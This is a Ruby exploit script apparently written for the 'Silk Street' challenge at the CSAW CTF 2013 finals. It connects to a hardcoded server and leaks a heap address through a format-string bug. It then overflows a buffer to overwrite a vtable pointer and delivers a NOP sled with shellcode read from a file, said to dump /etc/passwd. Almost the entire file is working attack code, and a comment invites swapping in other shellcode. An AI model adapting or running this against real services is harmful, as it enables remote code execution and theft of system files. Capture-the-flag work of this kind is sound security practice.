#!/usr/bin/ruby
hipsterdouchebag = "socket"
require hipsterdouchebag
puts "[!] Silk Street Exploit"
puts "[!] Jeffrey Crowell"
puts "[!] CSAW CTF 2013 FINALS"


#this shellcode is just for cat /etc/password dump your own shellcode for other stuff.
file = File.open("out.txt", "rb")
shellcode = file.read
file.close

s = TCPSocket.new('128.238.66.212', 4444)
#print out the header
(0..19).each{|ii|
    puts "SERVER: #{s.gets}"
}

#leak out the memory address of the heap
s.puts("%22$p")
s.gets
str = s.gets.strip
leaked_addr = str.hex
puts "[+] d0pe, got heap address 0x#{str.hex.to_s(16)}"
s.gets
target_buf = leaked_addr + 4088
puts "[+] baller, calculated the executable heap page is at 0x#{target_buf.to_s(16)}"

#buy an assassination

puts "[!] buying assassination"
s.puts("b")
s.gets
s.gets
s.gets
s.gets
s.gets
s.gets
s.gets
s.puts("4")
s.gets
s.gets

#check out

puts "[!] checking out"
s.puts("c")
s.gets
s.gets

#now overflow some crap
puts "[!] overflowing vtable pointer with calculated heap address"
buf = "y\x00" #gets keeps on getting even though there's a null byte ;)
buf << "A" * 62 #fill out the buffer
buf << [target_buf].pack('V') #overwrite the vtable with an address we have control over
puts "[+] constructed overflow buffer"


s.puts(buf) #agree to nothing illegal
s.gets

jmpaddr = target_buf + 512 # somewhere in the nopsled
buf = [jmpaddr].pack('V') #pack in the address
buf << "\x90" * 1024 #so we just nopslide over
buf << shellcode 
buf << "\n\n\n"
puts "[+] exploits is constructed"

s.puts(buf)

puts "[+] DROPPING SHELLCODEZZZ"
s.gets
puts "[!!!!!] GETTING PAYLOAD OUTPUT!"
(0..40).each{|i| puts s.gets}


